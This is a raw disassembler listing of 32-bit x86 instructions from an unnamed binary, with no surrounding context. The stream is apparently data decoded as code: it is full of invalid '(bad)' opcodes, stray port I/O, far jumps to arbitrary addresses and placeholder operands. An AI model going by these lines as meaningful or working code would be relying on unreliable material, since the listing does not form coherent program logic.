  416ed7:	mov    cl,BYTE PTR [ecx+0x6f]
  416eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416edb:	in     ax,dx
  416edd:	imul   ebx,DWORD PTR [eax+ebp*1-0x2c],0xffffffb4
  416ee2:	fisub  DWORD PTR [edi-0x4b]
  416ee5:	xor    BYTE PTR ds:0x150e4a0,cl
  416eeb:	sub    edx,edi
  416eed:	inc    ebx
  416eee:	mov    eax,ds:0x2bd3609
  416ef3:	ja     0x416f32
  416ef5:	sbb    al,0xf7
  416ef7:	dec    edi
  416ef8:	xor    esp,DWORD PTR [edi+0x3896ba3d]
  416efe:	jne    0x416ea0
  416f00:	ds inc esp
  416f02:	sbb    ebx,ebx
  416f04:	call   0x8e2d:0xeef721eb
  416f0b:	enter  0x33f4,0x8
  416f0f:	mov    ah,0x7
  416f11:	dec    edi
  416f12:	mov    ebx,0xcb6b7c1d
  416f17:	test   eax,0x50677a0a
  416f1c:	bound  edx,QWORD PTR [esi+0x6c0bda6c]
  416f22:	arpl   WORD PTR [esi-0x5fce071],bp
  416f28:	shl    edi,1
  416f2a:	jae    0x416f13
  416f2c:	and    al,0x8e
  416f2e:	sar    DWORD PTR [edx-0xf08dc97],1
  416f34:	jle    0x416ed6
  416f36:	mov    ebx,0x7d37ff43
  416f3b:	mov    al,0x7f
  416f3d:	test   al,0xf5
  416f3f:	mov    cl,0x32
  416f41:	pop    ebx
  416f42:	ins    BYTE PTR es:[edi],dx
  416f43:	loope  0x416ef5
  416f45:	push   es
  416f46:	mov    ebx,0x439df5b1
  416f4b:	cmp    ebp,DWORD PTR [edx-0x10]
  416f4e:	xor    eax,DWORD PTR [ecx+0x55]
  416f51:	call   0x3126cded
  416f56:	pop    ecx
  416f57:	(bad)  
  416f58:	std    
  416f59:	add    ecx,esp
  416f5b:	mov    ecx,0x180f60d2
  416f60:	xlat   BYTE PTR ds:[ebx]
  416f61:	push   0x78
  416f63:	es hlt 
  416f65:	ins    DWORD PTR es:[edi],dx
  416f66:	retf   0x5017
  416f69:	aas    
  416f6a:	(bad)  
  416f6b:	cmp    bh,ch
  416f6d:	push   cs
  416f6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f6f:	outs   dx,BYTE PTR ds:[esi]
  416f70:	ret    0x42d6
  416f73:	mov    ds:0xaad60e9d,al
  416f78:	sub    esp,eax
  416f7a:	dec    ebx
  416f7b:	xor    ah,BYTE PTR [ebx-0x49]
  416f7e:	lea    esp,[esi+0x78]
  416f81:	mov    ch,0x31
  416f83:	repz push ebp
  416f85:	add    ah,BYTE PTR [ebx-0xb40bac0]
  416f8b:	cli    
  416f8c:	or     BYTE PTR [eax-0x62],ch
  416f8f:	push   ebp
  416f90:	rcl    BYTE PTR [eax],0xd4
  416f93:	ja     0x416f54
  416f95:	push   0x8d768e67
  416f9a:	mov    BYTE PTR [edx+0x36],0x30
  416f9e:	push   0xffffffaf
  416fa0:	sub    cl,BYTE PTR [esi]
  416fa2:	jle    0x416f75
  416fa4:	fsub   QWORD PTR [eax+0x1af253f]
  416faa:	js     0x416f87
  416fac:	jmp    0x4dc9b4c9
  416fb1:	xor    ch,BYTE PTR cs:[ecx]
  416fb4:	push   ebp
  416fb5:	xchg   edx,eax
  416fb7:	xor    DWORD PTR [ebp-0x6f],0x2f
  416fbb:	lahf   
  416fbc:	fdecstp 
  416fbe:	out    0x6d,al
  416fc0:	mov    esi,0x219228d3
  416fc5:	fwait
  416fc6:	aad    0xc1
  416fc8:	mov    al,ds:0xbf3b5f84
  416fcd:	das    
  416fce:	and    bl,bh
  416fd0:	mov    fs,WORD PTR [ebp+esi*4+0x20]
  416fd4:	mov    ebx,edi
  416fd6:	mov    al,0xd8
  416fd8:	jae    0x416fcd
  416fda:	jp     0x416f94
  416fdc:	(bad)  
  416fdd:	jns    0x41705c
  416fdf:	xchg   BYTE PTR [ebp+0x1bfb990e],bh
  416fe5:	enter  0x24d3,0x9e
  416fe9:	imul   BYTE PTR [ebx]
  416feb:	inc    eax
  416fec:	mov    ds:0x21c16300,al
  416ff1:	fisttp WORD PTR [eax]
  416ff3:	int3   
  416ff4:	popa   
  416ff5:	ss pop ecx
  416ff7:	jle    0x416faf
  416ff9:	hlt    
  416ffa:	mov    ecx,DWORD PTR ds:0x4ea02597
  417000:	jmp    0x781b9393
  417005:	add    eax,0xa5f2a7db
  41700a:	test   al,0x97
  41700c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41700d:	retf   
  41700e:	mov    dl,0xae
  417010:	out    0xaf,al
  417012:	xchg   ecx,eax
  417013:	test   DWORD PTR [ecx],0x9c4b5656
  417019:	call   0x71998e50
  41701e:	in     al,dx
  41701f:	pop    esp
  417020:	(bad)  
  417021:	adc    DWORD PTR [edi],esp
  417023:	loope  0x417007
  417025:	mov    WORD PTR [esi+0x18],ds
  417028:	push   ecx
  417029:	or     eax,0x7ca87416
  41702e:	cmp    dl,BYTE PTR [edx]
  417030:	test   BYTE PTR [esi+eax*2-0x7e3b60d4],dh
  417037:	sahf   
  417038:	add    BYTE PTR [ecx+esi*8-0x1a],bh
  41703c:	cmp    eax,0xdfc11815
  417041:	or     eax,0xc5f0dd73
  417046:	xchg   esp,eax
  417047:	sub    al,cl
  417049:	ins    BYTE PTR es:[edi],dx
  41704a:	pop    es
  41704b:	lods   al,BYTE PTR ds:[esi]
  41704c:	call   0x3bf1d2f
  417051:	cmp    DWORD PTR [ecx],eax
  417053:	mov    BYTE PTR [esi],ch
  417055:	jnp    0x41705f
  417057:	loope  0x41701e
  417059:	fcom   DWORD PTR [ecx]
  41705b:	mov    ch,0xce
  41705d:	stos   BYTE PTR es:[edi],al
  41705e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41705f:	imul   ebx,DWORD PTR [eax-0x3b],0xffffffad
  417063:	mov    DWORD PTR [edx+0x2d84d430],esp
  417069:	push   fs
  41706b:	(bad)  
  41706c:	retf   0x328b
  41706f:	and    al,0xa4
  417071:	jmp    FWORD PTR [edx-0x753b8f82]
  417077:	mov    esi,0x5ee6e370
  41707c:	neg    DWORD PTR ds:0xc4fa1c8e
  417082:	aas    
  417083:	push   ebp
  417084:	out    dx,al
  417085:	outs   dx,BYTE PTR ds:[esi]
  417086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417087:	pop    edx
  417088:	sbb    dl,BYTE PTR cs:[esi-0x75]
  41708c:	sbb    al,0xe4
  41708e:	(bad)  [edx-0x4a79afa1]
  417094:	pop    esp
  417095:	pop    ss
  417096:	cli    
  417097:	ss dec edi
  417099:	mov    dl,0x19
  41709b:	mov    cl,0xdb
  41709d:	and    dh,ah
  41709f:	aaa    
  4170a0:	add    ah,BYTE PTR [ebx+0x40c29ec2]
  4170a6:	mov    eax,ds:0xd6957650
  4170ab:	pop    eax
  4170ac:	(bad)
  4170af:	lea    ebx,[ebx+0x61]
  4170b2:	inc    ecx
  4170b3:	aam    0x69
  4170b5:	dec    edx
  4170b6:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4170b8:	pop    esi
  4170b9:	mov    eax,ds:0xdab20869
  4170be:	jle    0x4170d0
  4170c0:	xchg   ebx,eax
  4170c1:	sub    ecx,DWORD PTR [eax]
  4170c3:	cld    
  4170c4:	push   ds
  4170c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170c6:	mov    edi,0x38dbe9a8
  4170cb:	inc    ebx
  4170cc:	sub    al,0xb9
  4170ce:	jmp    FWORD PTR [esi]
  4170d0:	sub    eax,0x24c75844
  4170d5:	and    eax,0x3e5a3b1d
  4170da:	sahf   
  4170db:	xchg   edi,ebp
  4170dd:	mov    edx,0x3ba37050
  4170e2:	lahf   
  4170e3:	or     dh,BYTE PTR [edi-0x318df5e8]
  4170e9:	push   esi
  4170ea:	arpl   WORD PTR [edx],di
  4170ec:	lds    ebp,FWORD PTR [ecx]
  4170ee:	inc    BYTE PTR [esi-0x4e]
  4170f1:	xor    edi,DWORD PTR [ecx-0x53898204]
  4170f7:	cdq    
  4170f8:	xchg   esi,eax
  4170f9:	push   ebx
  4170fa:	arpl   WORD PTR [ebp+0x34807250],bp
  417100:	inc    esp
  417101:	sti    
  417102:	xor    dl,BYTE PTR [edx-0x39]
  417105:	or     ebp,DWORD PTR [edx+0x56]
  417108:	or     eax,DWORD PTR [ebp-0x34]
  41710b:	in     al,dx
  41710c:	popf   
  41710d:	nop
  41710e:	jns    0x417158
  417110:	in     eax,0xe3
  417112:	repz fs dec edx
  417115:	add    edi,ebx
  417117:	xor    BYTE PTR [edx],al
  417119:	and    al,0xa9
  41711b:	in     eax,0x6c
  41711d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41711e:	inc    esp
  41711f:	cdq    
  417120:	push   edi
  417121:	frstor [ebx+0x7b]
  417124:	mov    ch,0xba
  417126:	jecxz  0x4170ee
  417128:	mov    eax,0x1487a03f
  41712d:	fst    QWORD PTR [edi-0x3f4da3cd]
  417133:	stos   DWORD PTR es:[edi],eax
  417134:	jmp    0xb1b2:0xb1f9fe33
  41713b:	test   eax,0x46662010
  417140:	fcmove st,st(5)
  417142:	gs dec ebp
  417144:	sahf   
  417145:	out    0x54,eax
  417147:	jo     0x417189
  417149:	mov    al,ds:0x5f92f62b
  41714e:	ret    0x3e8c
  417151:	test   eax,0xa2de651d
  417156:	repnz and BYTE PTR [eax-0x714253cc],cl
  41715d:	push   ds
  41715e:	add    edx,esp
  417160:	ss out 0xc9,eax
  417163:	mov    WORD PTR [eax-0x665866b5],ds
  417169:	dec    edx
  41716a:	and    ch,0x61
  41716d:	xor    al,0xae
  417170:	sbb    BYTE PTR [eax-0x2b],ah
  417173:	push   edx
  417174:	dec    eax
  417176:	mov    eax,ds:0xb66d63d5
  41717b:	jp     0x417105
  41717d:	imul   eax,DWORD PTR [edx-0x39],0xffffff84
  417181:	mov    ebx,0xf3a4efef
  417186:	adc    al,0x43
  417188:	leave  
  417189:	in     al,0xef
  41718b:	jmp    0x5408:0xb316f365
  417192:	(bad)  
  417193:	shr    dl,1
  417195:	mov    edi,DWORD PTR [edx+0x4eb2dc86]
  41719b:	sbb    BYTE PTR [esi+0x22],0x6e
  41719f:	push   ds
  4171a0:	fdivr  QWORD PTR [ecx+0x0]
  4171a3:	or     esi,DWORD PTR [ecx+0x1f]
  4171a6:	inc    ebp
  4171a7:	mov    ch,0x58
  4171a9:	jbe    0x4171d4
  4171ab:	or     dh,BYTE PTR [esi-0x31]
  4171ae:	pushf  
  4171af:	dec    esp
  4171b0:	cmp    eax,0x23a17807
  4171b5:	mov    ecx,0xa94bae9
  4171ba:	out    dx,al
  4171bb:	call   0x30fd:0x2a8415d0
  4171c2:	enter  0xc2eb,0x37
  4171c6:	addr16 sbb eax,0x7a6e4dbf
  4171cc:	sub    al,0xfc
  4171ce:	dec    ebp
  4171cf:	ror    edx,cl
  4171d1:	mov    eax,ds:0xa9ac4687
  4171d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171d7:	hlt    
  4171d8:	rol    BYTE PTR [edx+0xbaf171f],cl
  4171de:	mov    ecx,0xfa1f6171
  4171e3:	jbe    0x41718b
  4171e5:	fsub   DWORD PTR [ebx-0x19a5fe37]
  4171eb:	xor    eax,0x362421ef
  4171f0:	pop    edx
  4171f1:	jno    0x417257
  4171f3:	cdq    
  4171f4:	xchg   esi,eax
  4171f5:	jg     0x417258
  4171f7:	adc    ecx,ebx
  4171f9:	mov    esp,0x804dd0f2
  4171fe:	xor    esi,esi
  417200:	outs   dx,BYTE PTR ds:[esi]
  417201:	push   eax
  417202:	lea    esi,[edi]
  417204:	hlt    
  417205:	inc    ebp
  417206:	pop    ebx
  417207:	aam    0x24
  417209:	push   ebp
  41720a:	out    dx,al
  41720b:	sbb    ch,cl
  41720d:	call   0x15b3d7dc
  417212:	dec    ecx
  417213:	adc    DWORD PTR [ecx+eiz*4],0xabefb40a
  41721a:	jp     0x417201
  41721c:	or     dh,ah
  41721e:	ret    
  41721f:	xor    cl,BYTE PTR [esi+eiz*8]
  417222:	scas   eax,DWORD PTR es:[edi]
  417223:	psrlq  mm2,QWORD PTR [eax]
  417226:	xchg   DWORD PTR [ebx-0x9],ebx
  417229:	ins    DWORD PTR es:[edi],dx
  41722a:	outs   dx,DWORD PTR ds:[esi]
  41722b:	sub    eax,0xbcfd4a3c
  417230:	and    al,0xa8
  417232:	jbe    0x417254
  417234:	bound  esp,QWORD PTR [ebx]
  417236:	dec    esi
  417237:	cmp    al,0xfc
  417239:	add    edx,DWORD PTR [ecx+0x2819c213]
  41723f:	mov    dh,0x18
  417241:	cmp    bh,BYTE PTR [ecx+0x30]
  417244:	and    edx,DWORD PTR [eax+0x33]
  417247:	aad    0x85
  417249:	push   esp
  41724a:	(bad)  
  41724b:	push   esi
  41724c:	dec    eax
  41724d:	mov    bl,0x3a
  41724f:	ret    
  417250:	push   ecx
  417251:	cvtps2pi mm5,QWORD PTR [esi+ebp*4+0x43]
  417256:	push   ebp
  417257:	mov    al,0x7d
  417259:	push   ebx
  41725a:	in     al,0xdd
  41725c:	and    al,0xb6
  41725e:	mov    edx,?
  417260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417261:	push   esi
  417262:	xchg   DWORD PTR [eax+0x5fd891d9],ecx
  417268:	ficom  WORD PTR [edi+0x28]
  41726b:	pop    esp
  41726c:	enter  0xb42,0x24
  417270:	int3   
  417271:	cld    
  417272:	sbb    al,0x58
  417274:	inc    esp
  417275:	mov    DWORD PTR [ebp-0x2861840e],eax
  41727b:	jp     0x417245
  41727d:	sar    DWORD PTR [edx],0x23
  417280:	fdiv   QWORD PTR [ebp-0x6fe93142]
  417286:	and    al,BYTE PTR [eax-0x3e]
  417289:	scas   eax,DWORD PTR es:[edi]
  41728a:	aas    
  41728b:	push   ebx
  41728c:	push   eax
  41728d:	dec    edi
  41728e:	dec    esi
  41728f:	mov    edx,0x31b073f9
  417294:	scas   eax,DWORD PTR es:[edi]
  417295:	fsub   DWORD PTR [edx+0x775d2c98]
  41729b:	cmp    esi,DWORD PTR [esi+0x5f2eb589]
  4172a1:	out    dx,eax
  4172a2:	push   eax
  4172a3:	jns    0x417253
  4172a5:	jmp    0x98cf9c97
  4172aa:	jo     0x417259
  4172ac:	mov    esp,0x69b8285b
  4172b1:	push   edi
  4172b2:	outs   dx,BYTE PTR ds:[esi]
  4172b3:	xor    esi,DWORD PTR [eax-0x53]
  4172b6:	xchg   esi,eax
  4172b7:	or     bl,ch
  4172b9:	add    al,0xf8
  4172bb:	xchg   BYTE PTR [ecx-0x1d],bh
  4172be:	out    dx,al
  4172bf:	mov    bh,0xf2
  4172c1:	mov    bl,ch
  4172c3:	icebp  
  4172c4:	fs (bad) 
  4172c6:	rol    DWORD PTR [ecx],1
  4172c8:	fcomp  DWORD PTR [ebx+0xe]
  4172cb:	add    eax,0x7b36dc3d
  4172d0:	pop    es
  4172d1:	pop    DWORD PTR [edi]
  4172d3:	es aam 0xfe
  4172d6:	shl    DWORD PTR [eax+0x64],1
  4172d9:	mov    ah,0x6d
  4172dc:	sti    
  4172dd:	test   BYTE PTR [ebp+0x63ebd9c0],bl
  4172e3:	jmp    0xdbd51277
  4172e8:	mov    WORD PTR [eax+ebx*2+0x47],ds
  4172ec:	fdivr  DWORD PTR [ecx+esi*1-0x27]
  4172f0:	jns    0x4172ab
  4172f2:	stc    
  4172f3:	nop
  4172f4:	popf   
  4172f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172f6:	mov    edi,0x859bbe5d
  4172fb:	add    al,0xaa
  4172fd:	fiadd  DWORD PTR [eax+0x2b5f02f]
  417303:	lods   al,BYTE PTR ds:[esi]
  417304:	out    dx,al
  417305:	pop    ebx
  417306:	in     al,0xe3
  417308:	pop    ds
  417309:	fist   DWORD PTR [edi+0x33bf59ea]
  41730f:	jns    0x4172c5
  417311:	xchg   ebp,eax
  417312:	adc    DWORD PTR ds:0xe65f8c86,edx
  417318:	pop    ebx
  417319:	retf   0xb063
  41731c:	imul   ebp,DWORD PTR [ebx+edx*4-0x72],0x7c
  417321:	outs   dx,BYTE PTR ds:[esi]
  417322:	ins    DWORD PTR es:[edi],dx
  417323:	xor    dh,BYTE PTR [ebx-0x9]
  417326:	and    al,0x97
  417328:	ins    BYTE PTR es:[edi],dx
  417329:	inc    eax
  41732a:	loop   0x41732f
  41732c:	mov    esi,0xf67b1d46
  417331:	retf   0x5513
  417334:	xor    BYTE PTR [esi],dh
  417336:	ficomp WORD PTR [ebx+0x51d2ff5d]
  41733c:	xor    al,0x41
  41733e:	test   BYTE PTR [eax],ch
  417340:	test   al,0xd6
  417342:	push   DWORD PTR [ebp+ecx*4-0x242ee5c8]
  417349:	push   edx
  41734a:	dec    esi
  41734b:	into   
  41734c:	pop    esi
  41734d:	nop
  41734e:	add    eax,0x3ce2d5b8
  417353:	fsub   st,st(3)
  417355:	adc    al,0x3b
  417357:	out    dx,al
  417358:	inc    edi
  417359:	pop    ss
  41735a:	mov    ah,0xb3
  41735c:	mov    ebx,0xaeafe279
  417361:	rol    BYTE PTR [edi],0xc1
  417364:	xchg   esp,eax
  417365:	and    dl,BYTE PTR [edi-0x51187f4d]
  41736b:	cld    
  41736c:	(bad)  
  41736d:	loop   0x4173a6
  41736f:	mov    edx,0x3b4e8a60
  417374:	ret    0xa165
  417377:	and    eax,0x1f32e54c
  41737c:	sbb    BYTE PTR [ebp+0x72],dh
  41737f:	dec    BYTE PTR ds:0x5f9c6db0
  417385:	out    dx,eax
  417386:	or     eax,0xf177c1ad
  41738b:	call   0x799a:0x74c2283
  417392:	mov    ecx,ebx
  417394:	test   DWORD PTR [ebp+0x6b],ecx
  417397:	jecxz  0x417408
  417399:	into   
  41739a:	ss adc eax,0x8f2145a
  4173a0:	dec    edx
  4173a1:	and    al,0xd2
  4173a3:	out    0xa4,eax
  4173a5:	and    BYTE PTR [edi+0x1c],ch
  4173a8:	fisubr DWORD PTR [ebp*2+0x6f0d8035]
  4173af:	and    esp,edi
  4173b1:	shl    al,1
  4173b3:	xchg   ecx,eax
  4173b4:	and    al,BYTE PTR [eax+0x3e]
  4173b7:	mov    ch,0x77
  4173b9:	jl     0x417350
  4173bb:	or     BYTE PTR [ecx+0xf],al
  4173be:	mov    dh,0xf
  4173c0:	mov    esp,0x2bba138f
  4173c5:	push   ss
  4173c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173c7:	imul   ecx,ecx,0x70d50980
  4173cd:	fwait
  4173ce:	repz neg esp
  4173d1:	test   DWORD PTR [ecx-0x4d],0xbdcb2fc0
  4173d8:	mov    ds:0x77a40602,eax
  4173dd:	and    BYTE PTR [ecx],0xd1
  4173e0:	(bad)  
  4173e1:	cmp    al,0xcd
  4173e3:	jmp    0x297296f2
  4173e8:	mov    edx,0x34e7e4e5
  4173ed:	loop   0x41737f
  4173ef:	sub    al,0xd1
  4173f1:	jb     0x4173be
  4173f3:	push   edx
  4173f4:	popf   
  4173f5:	aad    0xe2
  4173f7:	pusha  
  4173f8:	pop    ebp
  4173f9:	cmc    
  4173fa:	fild   DWORD PTR [edi-0x7b070b41]
  417400:	inc    ebp
  417401:	push   eax
  417402:	pop    ecx
  417403:	sub    ebp,DWORD PTR [ebp+edi*8-0x4c8445b2]
  41740a:	xchg   BYTE PTR [edx-0xebe76a7],al
  417410:	sbb    DWORD PTR [ebx],eax
  417412:	loopne 0x41747a
  417414:	into   
  417415:	pop    ebx
  417416:	lods   al,BYTE PTR ds:[esi]
  417417:	leave  
  417418:	push   esi
  417419:	(bad)  
  41741a:	ret    
  41741b:	mov    bl,BYTE PTR [edi+0x5e]
  41741e:	std    
  41741f:	cmp    BYTE PTR ds:0xbe3f1da2,0x77
  417426:	repz pop ecx
  417428:	sbb    ch,BYTE PTR [ebx+0x74f8aa7a]
  41742e:	ja     0x417431
  417430:	dec    edi
  417431:	icebp  
  417432:	mov    cl,0x9a
  417434:	aam    0xbf
  417436:	arpl   ax,ax
  417438:	out    dx,eax
  417439:	ss mov dh,0xe9
  41743c:	sbb    ch,0xe6
  41743f:	cmp    al,0x66
  417441:	jne    0x417436
  417443:	xchg   edx,eax
  417444:	aam    0x96
  417446:	and    ah,0x9b
  417449:	mov    BYTE PTR [eax-0x15],cl
  41744c:	dec    edi
  41744d:	xchg   ebp,eax
  41744e:	lock lahf 
  417450:	cmp    DWORD PTR [esi],ebx
  417452:	test   BYTE PTR [edx],dh
  417454:	test   DWORD PTR [ecx+0x596c1c61],esi
  41745a:	loopne 0x417436
  41745c:	jbe    0x417486
  41745e:	cmp    al,0xa9
  417460:	das    
  417461:	call   0x601fae84
  417466:	jnp    0x417488
  417468:	aad    0x40
  41746a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41746b:	pop    edx
  41746c:	push   edx
  41746d:	sub    BYTE PTR [ebx-0x3ce9b8ad],bh
  417473:	jg     0x417476
  417475:	add    cl,BYTE PTR [ebx]
  417477:	in     eax,0x51
  417479:	fnsave [edx]
  41747b:	xor    ebp,DWORD PTR ds:0x9753189d
  417481:	cmp    dh,BYTE PTR [ebx+0x2a46afb6]
  417487:	xchg   ebp,eax
  417488:	jno    0x4174ed
  41748a:	imul   edi,DWORD PTR [ebx],0x235c6914
  417490:	outs   dx,DWORD PTR ds:[esi]
  417491:	cdq    
  417492:	mov    eax,0x5921c899
  417497:	sub    ebp,DWORD PTR [ecx-0x6e6b093c]
  41749d:	push   ebx
  41749e:	push   es
  41749f:	shl    ebp,0x2c
  4174a2:	pushf  
  4174a3:	test   eax,0x61d5300d
  4174a8:	(bad)  
  4174a9:	ins    BYTE PTR es:[edi],dx
  4174aa:	mov    bl,0x42
  4174ac:	dec    ebp
  4174ad:	loopne 0x41749a
  4174af:	es push 0xffffff9e
  4174b2:	(bad)  
  4174b3:	fdecstp 
  4174b5:	in     eax,0xcd
  4174b7:	dec    ebx
  4174b8:	mov    ebx,0xe51338a5
  4174bd:	mov    ch,0xeb
  4174bf:	addr16 out dx,eax
  4174c1:	mov    eax,0x483740f1
  4174c6:	add    DWORD PTR [eax+0x5a3f2bee],ebx
  4174cc:	cmp    ecx,0x41f99608
  4174d2:	dec    esp
  4174d3:	ret    0x789
  4174d6:	inc    esp
  4174d7:	mov    ch,0x1d
  4174d9:	aad    0xc3
  4174db:	dec    edi
  4174dc:	js     0x41753f
  4174de:	jmp    0x41747a
  4174e0:	pop    edx
  4174e1:	lock jbe 0x417545
  4174e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174e5:	xchg   edi,eax
  4174e6:	jo     0x4174e7
  4174e8:	dec    ebx
  4174e9:	(bad)  
  4174ea:	fdiv   QWORD PTR [edx]
  4174ec:	mov    bh,BYTE PTR [ebx+ebp*2+0x12324143]
  4174f3:	fld    TBYTE PTR [ecx]
  4174f5:	rol    DWORD PTR [ecx-0x82a2bda],cl
  4174fb:	jge    0x4174ef
  4174fd:	(bad)  
  4174fe:	mov    bl,0x55
  417500:	loope  0x4174c0
  417502:	pop    ebp
  417503:	dec    ebx
  417504:	push   cs
  417505:	in     eax,0xd5
  417507:	inc    esi
  417508:	loop   0x4174ad
  41750a:	xor    eax,0xa1703446
  41750f:	mov    al,0x24
  417511:	sahf   
  417512:	xchg   ecx,eax
  417513:	push   ebp
  417514:	cmp    eax,0x4b624363
  417519:	inc    eax
  41751a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41751b:	sbb    DWORD PTR [ebx],ebx
  41751d:	enter  0x3151,0x4d
  417521:	xor    al,0xae
  417523:	push   ds
  417524:	je     0x41756a
  417526:	mov    eax,0xb73d96d
  41752b:	and    BYTE PTR [esp+esi*1-0xace30c5],ch
  417532:	xchg   ebp,eax
  417533:	ret    0x30ed
  417536:	xor    eax,0x5c9727bc
  41753b:	mov    esp,0x65f4ceb9
  417540:	xor    DWORD PTR [ebx-0x185028ce],0x27
  417547:	inc    edi
  417548:	mov    ecx,0xb7fae07
  41754d:	fst    DWORD PTR [esi+edi*8-0x2b]
  417551:	sbb    dh,BYTE PTR [edi]
  417553:	js     0x4174fc
  417555:	mov    ds:0x7defab43,eax
  41755a:	cmp    ah,BYTE PTR [ecx*2-0x1bf064b4]
  417561:	jp     0x417554
  417563:	cmp    esi,edx
  417565:	(bad)  
  417567:	push   esp
  417568:	repnz jmp 0x229e:0xcc23a923
  417570:	cdq    
  417571:	js     0x417571
  417573:	ret    0xa190
  417576:	and    eax,0xcfc8fb75
  41757b:	dec    eax
  41757c:	imul   esp,DWORD PTR [esp+ecx*1],0x46
  417580:	lods   eax,DWORD PTR ds:[esi]
  417581:	je     0x417584
  417583:	fidiv  WORD PTR [eax]
  417585:	jno    0x41751d
  417587:	mov    esp,?
  417589:	cld    
  41758a:	push   edi
  41758b:	or     eax,0xcb714435
  417590:	inc    ebp
  417591:	(bad)  
  417592:	mov    ds:0xbcfbef63,al
  417597:	enter  0x6b6,0xae
  41759b:	jecxz  0x4175ec
  41759d:	jae    0x4175a1
  41759f:	mul    al
  4175a1:	inc    esp
  4175a2:	ja     0x41757b
  4175a4:	fdiv   DWORD PTR [ecx]
  4175a6:	xor    edx,DWORD PTR [ecx-0x1125d964]
  4175ac:	cmc    
  4175ad:	inc    esp
  4175ae:	enter  0x6a3c,0x94
  4175b2:	rcr    DWORD PTR [esi+0x16],cl
  4175b5:	cmp    eax,DWORD PTR cs:[edi]
  4175b8:	ins    BYTE PTR es:[edi],dx
  4175b9:	lods   eax,DWORD PTR ds:[esi]
  4175ba:	push   ebx
  4175bb:	mov    al,0x7
  4175bd:	jns    0x41755f
  4175bf:	das    
  4175c0:	add    al,0x71
  4175c2:	cmp    BYTE PTR [ecx+0x13],bl
  4175c5:	pusha  
  4175c6:	mov    bl,0x9
  4175c8:	mov    ds,WORD PTR [esp+esi*8-0x4571f1da]
  4175cf:	push   cs
  4175d0:	push   esp
  4175d1:	dec    esi
  4175d2:	in     al,dx
  4175d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175d4:	cmc    
  4175d5:	xchg   edx,eax
  4175d6:	clc    
  4175d7:	xchg   ebx,eax
  4175d8:	pop    ds
  4175d9:	add    eax,0x312cfd0
  4175de:	test   DWORD PTR [ebx],esp
  4175e0:	xchg   edx,eax
  4175e1:	add    edx,edi
  4175e3:	loope  0x417580
  4175e5:	test   DWORD PTR [edi+0xf951e26],ecx
  4175eb:	fwait
  4175ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175ed:	inc    esp
  4175ee:	cmp    edi,DWORD PTR [esi]
  4175f0:	adc    al,0xdd
  4175f2:	fbstp  TBYTE PTR [ebp+0x533f833a]
  4175f8:	ins    DWORD PTR es:[edi],dx
  4175f9:	adc    eax,0xf81f494d
  4175fe:	pushf  
  4175ff:	adc    DWORD PTR [ebp+ecx*4+0x2256c4c3],eax
  417606:	push   edx
  417607:	push   ss
  417608:	or     BYTE PTR [edi],cl
  41760a:	cmc    
  41760b:	retf   0xd635
  41760e:	pop    esp
  41760f:	test   al,0xa5
  417611:	xor    DWORD PTR [eax],ebp
  417613:	xor    DWORD PTR cs:[eax-0x7cf66a97],esi
  41761a:	or     al,0x39
  41761c:	sbb    BYTE PTR [esi+edx*4-0x20055ff5],bl
  417623:	mul    DWORD PTR [eax+0x74]
  417626:	es shr esp,1
  417629:	ins    DWORD PTR es:[edi],dx
  41762a:	imul   esi,DWORD PTR [edx+ecx*1-0x33c0e298],0xffffffae
  417632:	jno    0x417651
  417634:	loope  0x417610
  417636:	jnp    0x4176b1
  417638:	mov    dh,0x2c
  41763a:	cmp    ax,0x801c
  41763e:	clc    
  41763f:	jmp    0xee0a4a49
  417644:	add    BYTE PTR [edi+0x35],ch
  417647:	adc    al,0xff
  417649:	xor    eax,0x44738522
  41764e:	xchg   DWORD PTR ds:0x6771e67c,eax
  417654:	push   esi
  417655:	lods   al,BYTE PTR ds:[esi]
  417656:	je     0x41766a
  417658:	cmp    ah,BYTE PTR [edx+0xf]
  41765b:	div    bl
  41765d:	mov    ?,WORD PTR [eax-0x215b478f]
  417663:	jo     0x4176bd
  417665:	xchg   edi,eax
  417666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417667:	out    0x76,al
  417669:	repz sar DWORD PTR [edi],cl
  41766c:	and    esi,DWORD PTR [ecx-0x48]
  41766f:	push   ebp
  417670:	add    ebx,esi
  417672:	mov    dh,dh
  417674:	push   ebp
  417675:	cs ins DWORD PTR es:[edi],dx
  417677:	push   eax
  417678:	jg     0x4176c8
  41767a:	imul   esp,DWORD PTR [edi+ecx*1+0x7e],0xffffffdf
  41767f:	std    
  417680:	imul   edi,DWORD PTR [esi-0x60dc2bb],0x23
  417687:	xchg   ecx,eax
  417688:	push   ecx
  417689:	xor    esi,edx
  41768b:	pop    ecx
  41768c:	test   BYTE PTR [esi+ecx*8],bl
  41768f:	lods   eax,DWORD PTR ds:[esi]
  417690:	shl    bh,0xf0
  417693:	fmul   st(4),st
  417695:	mov    edx,0xad6c0da2
  41769a:	mov    ch,0xfd
  41769c:	sub    ah,BYTE PTR [ebp+0x54bd6000]
  4176a2:	cmp    al,0x37
  4176a4:	cmp    DWORD PTR es:[edi+0x29],ebp
  4176a8:	jae    0x4176da
  4176aa:	ds aas 
  4176ac:	xor    eax,0x4ecdcf99
  4176b1:	mov    cl,0xbc
  4176b3:	xor    esi,DWORD PTR [eax]
  4176b5:	jmp    0xbf73:0xdd36037e
  4176bc:	mov    edi,0xcd34b93b
  4176c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176c2:	clc    
  4176c3:	xchg   esp,eax
